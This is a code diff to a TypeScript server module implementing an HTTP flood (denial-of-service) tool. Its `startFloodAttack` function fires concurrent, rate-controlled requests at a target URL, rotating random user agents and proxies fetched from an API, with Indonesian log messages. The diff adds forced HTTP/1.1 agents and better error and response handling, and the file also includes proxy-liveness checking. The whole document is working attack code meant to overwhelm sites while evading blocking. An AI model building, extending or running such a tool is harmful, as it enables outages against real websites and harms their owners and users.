@@ -2,6 +2,7 @@
 "use server";
 
 import { HttpsProxyAgent } from "https-proxy-agent";
+import https from 'node:https'; // Import the https module
 import { USER_AGENTS } from "@/lib/user-agents";
 
 export interface FloodStats {
@@ -12,7 +13,7 @@ export interface FloodStats {
   statusCodeCounts?: Record<number, number>;
 }
 
-const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
+const METHODS_WITHOUT_BODY_BASE = ["GET", "HEAD", "DELETE", "OPTIONS"];
 const PROXY_TEST_URL = "https://www.google.com/generate_204";
 const PROXY_TEST_TIMEOUT_MS = 7000;
 const CONCURRENT_PROXY_CHECKS = 10;
@@ -31,14 +32,14 @@ const sanitizeProxyEntry = (entry: string): string | null => {
 
 export async function startFloodAttack(
   targetUrl: string,
-  method: string,
+  method: string, // This can be "GET", "POST", or "HTTP/1.1 GET", "HTTP/1.1 POST", etc.
   headersString?: string,
   body?: string,
   concurrency?: number,
   rate?: number,
   durationInSeconds?: number,
-  proxiesString?: string, // Proxies from textarea
-  proxyApiUrl?: string    // API URL for dynamic fetching
+  proxiesString?: string, 
+  proxyApiUrl?: string    
 ): Promise<FloodStats> {
   let parsedUrl: URL;
   try {
@@ -59,6 +60,17 @@ export async function startFloodAttack(
     return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
   }
 
+  let actualHttpMethod = method;
+  let isHttp1Forced = false;
+
+  if (method.startsWith("HTTP/1.1 ")) {
+    isHttp1Forced = true;
+    actualHttpMethod = method.substring("HTTP/1.1 ".length); // e.g., "GET"
+  }
+  
+  const baseMethodsWithoutBody = ["GET", "HEAD", "DELETE", "OPTIONS"];
+
+
   const parsedHeaders: HeadersInit = {};
   let customUserAgentProvided = false;
   if (headersString) {
@@ -78,11 +90,11 @@ export async function startFloodAttack(
   }
 
   const baseFetchOptions: RequestInit = {
-    method: method.toUpperCase(),
-    signal: AbortSignal.timeout(5000)
+    method: actualHttpMethod.toUpperCase(), // Use the parsed actual HTTP method
+    signal: AbortSignal.timeout(5000) // 5-second timeout for each request
   };
 
-  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
+  if (body && !baseMethodsWithoutBody.includes(actualHttpMethod.toUpperCase())) {
     baseFetchOptions.body = body;
     const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
     if (!hasContentType) {
@@ -90,32 +102,36 @@ export async function startFloodAttack(
             JSON.parse(body);
             parsedHeaders['Content-Type'] = 'application/json';
         } catch (e) {
-            parsedHeaders['Content-Type'] = 'text/plain';
+            // If body is not JSON, assume plain text or let user specify via headers
+            if (!parsedHeaders['Content-Type']) { // Only set if not already set by user
+                 parsedHeaders['Content-Type'] = 'text/plain';
+            }
         }
     }
   }
 
+
   let currentActiveProxies: string[] = [];
   let lastProxyRefreshTime = 0;
 
-  const tryFetchFromApi = async (url: string): Promise<string[] | null> => {
+  const tryFetchFromApi = async (apiUrlToFetch: string): Promise<string[] | null> => {
     try {
-        const response = await fetch(url, { signal: AbortSignal.timeout(7000), headers: { 'Accept': 'text/plain' } });
+        const response = await fetch(apiUrlToFetch, { signal: AbortSignal.timeout(7000), headers: { 'Accept': 'text/plain' } });
         if (response.ok) {
             const text = await response.text();
             if (text.trim()) {
                 const lines = text.trim().split('\n');
                 const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];
                 if (sanitizedProxies.length > 0) return sanitizedProxies;
-                console.warn(`Proxy API ${url} returned empty or no valid ip:port entries after sanitization.`);
+                console.warn(`Proxy API ${apiUrlToFetch} returned empty or no valid ip:port entries after sanitization.`);
             } else {
-                console.warn(`Proxy API ${url} returned empty content during fetch operation.`);
+                console.warn(`Proxy API ${apiUrlToFetch} returned empty content during fetch operation.`);
             }
         } else {
-             console.warn(`Failed to fetch proxies from ${url}: ${response.status} ${response.statusText}`);
+             console.warn(`Failed to fetch proxies from ${apiUrlToFetch}: ${response.status} ${response.statusText}`);
         }
     } catch (e: any) {
-        console.error(`Error fetching proxies from ${url}:`, e.message);
+        console.error(`Error fetching proxies from ${apiUrlToFetch}:`, e.message);
     }
     return null;
   };
@@ -131,7 +147,6 @@ export async function startFloodAttack(
     return sanitizedProxies;
   };
 
-  // Initial proxy setup
   if (proxyApiUrl) {
     console.log("Attempting initial proxy fetch from API:", proxyApiUrl);
     const apiProxies = await tryFetchFromApi(proxyApiUrl);
@@ -168,7 +183,11 @@ export async function startFloodAttack(
   const startTime = Date.now();
   const endTime = startTime + safeDuration * 1000;
 
-  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}`);
+  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
+  
+  // Create a reusable https.Agent for forcing HTTP/1.1 on non-proxied requests if needed
+  const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ alpnProtocols: ['http/1.1'] }) : undefined;
+
 
   try {
     while (Date.now() < endTime) {
@@ -198,21 +217,32 @@ export async function startFloodAttack(
             currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
         }
         currentFetchOptions.headers = currentHeaders;
+        
+        let agentToUse: any = undefined;
 
         if (currentActiveProxies.length > 0) {
           const proxyConfig = currentActiveProxies[totalSent % currentActiveProxies.length];
-          // The HttpsProxyAgent expects the proxy string without the scheme, e.g., "user:pass@host:port" or "host:port"
           try {
-            const agent = new HttpsProxyAgent(`http://${proxyConfig}`); // HttpsProxyAgent needs a scheme for its internal URL parsing, but it uses the host/port/auth from it.
-            currentFetchOptions.agent = agent as any;
-          } catch (e) {
-            console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
+            if (isHttp1Forced && parsedUrl.protocol === "https:") {
+              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, { alpnProtocols: ['http/1.1'] });
+            } else {
+              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`);
+            }
+          } catch (e: any) {
+            console.error(`Error creating proxy agent for ${proxyConfig}:`, e.message);
             failed++;
-            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as network/proxy error
+            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
             totalSent++;
             continue;
           }
+        } else if (http1Agent) { // No proxy, but HTTP/1.1 is forced for HTTPS
+            agentToUse = http1Agent;
         }
+        
+        if (agentToUse) {
+            currentFetchOptions.agent = agentToUse;
+        }
+
 
         requestsInBatch.push(
           fetch(targetUrl, currentFetchOptions)
@@ -224,13 +254,16 @@ export async function startFloodAttack(
               } else {
                 failed++;
               }
+              // Consume the response body to free up resources, even if not used
+              return response.arrayBuffer().catch(() => {});
             })
             .catch((e: any) => {
               failed++;
-              if (e.name === 'AbortError' || e.name === 'TimeoutError') {
-                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // Mark as timeout/abort
+              if (e.name === 'AbortError' || e.name === 'TimeoutError' || (e.cause && (e.cause.code === 'UND_ERR_CONNECT_TIMEOUT' || e.cause.code === 'ECONNRESET'))) {
+                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // Mark as timeout/abort/connection reset
               } else {
                  statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // Mark as other network/proxy error
+                 // console.warn(`Request failed with non-timeout error: ${e.message}`, e.cause);
               }
             })
             .finally(() => {
@@ -266,14 +299,14 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     return { error: "URL API tidak boleh kosong." };
   }
   try {
-    new URL(apiUrl); // Validates URL format
+    new URL(apiUrl); 
   } catch (e) {
     return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
   }
 
   try {
     const response = await fetch(apiUrl, {
-      signal: AbortSignal.timeout(10000), // 10-second timeout for fetching proxies
+      signal: AbortSignal.timeout(10000), 
       headers: { 'Accept': 'text/plain' }
     });
     if (!response.ok) {
@@ -313,13 +346,9 @@ export async function checkProxies(proxiesString: string): Promise<{
     return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
   }
 
-  // ProxiesString is expected to be pre-validated by the form (no http schemes)
-  // or pre-sanitized if coming from an internal source.
-  // This function primarily focuses on reachability.
   const proxyEntries = proxiesString.split('\n')
     .map(line => line.trim())
     .filter(line => {
-      // Ensure no schemes and basic host:port structure
       if (line.startsWith("http://") || line.startsWith("https://")) return false;
       return line.includes(':') && line.lastIndexOf(':') > 0 && line.length > 3;
     });
@@ -333,18 +362,14 @@ export async function checkProxies(proxiesString: string): Promise<{
 
   const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => {
     try {
-      // HttpsProxyAgent needs a scheme for its internal URL parsing.
-      // The proxyUrl itself should be scheme-less, e.g., "user:pass@host:port" or "host:port"
       const agent = new HttpsProxyAgent(`http://${proxyUrl}`);
       const response = await fetch(PROXY_TEST_URL, {
         agent: agent as any,
         signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
-        redirect: 'manual', // We only care about reachability, not the content of the redirect
+        redirect: 'manual', 
       });
-      // Google's generate_204 returns 204. Other test URLs might return 200.
       return response.status === 204 || response.status === 200;
     } catch (error: any) {
-      // console.warn(`Proxy check failed for ${proxyUrl}: ${error.message}`);
       return false;
     }
   };
@@ -363,7 +388,6 @@ export async function checkProxies(proxiesString: string): Promise<{
           deadCount++;
         }
       } else {
-        // Promise rejected (e.g., unexpected error in checkSingleProxy)
         deadCount++;
       }
     });
@@ -376,3 +400,5 @@ export async function checkProxies(proxiesString: string): Promise<{
     totalChecked: proxyEntries.length,
   };
 }
+
+    
